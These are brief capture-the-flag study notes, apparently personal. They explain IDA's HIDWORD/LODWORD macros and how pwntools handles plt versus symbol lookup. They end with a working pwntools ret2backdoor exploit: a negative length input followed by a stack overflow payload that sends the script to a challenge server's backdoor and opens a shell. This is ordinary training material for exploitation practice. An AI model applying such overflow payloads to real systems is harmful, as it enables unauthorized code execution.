The function of HIDWORD is to get the four bytes located in the high part of memory of an 8-byte variable (i.e., a 32-bit value), i.e., two words of data
The function of LODWORD is to get the four bytes located in the low part of memory of an 8-byte variable (i.e., a 32-bit value), i.e., two words of data

IDA's stack is not entirely accurate; the saved ebp is not even shown, so IDA can only be used as a reference
There is no file.plt["backdoor"]; plt only exists for external functions, so you can only use file.symbol["backdoor"]
Using file.plt["system"] does not work, because overwriting the return address directly like this provides no argument

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
file=remote("node4.anna.nssctf.cn","28129")
elf=ELF("/home/llk/下载/pwn")
file.sendlineafter("name:","-1")
system_addr=elf.sym["backdoor"]
payload=b'a'*0x18+p64(system_addr)
file.sendlineafter("name?\n",payload)
file.interactive()
```
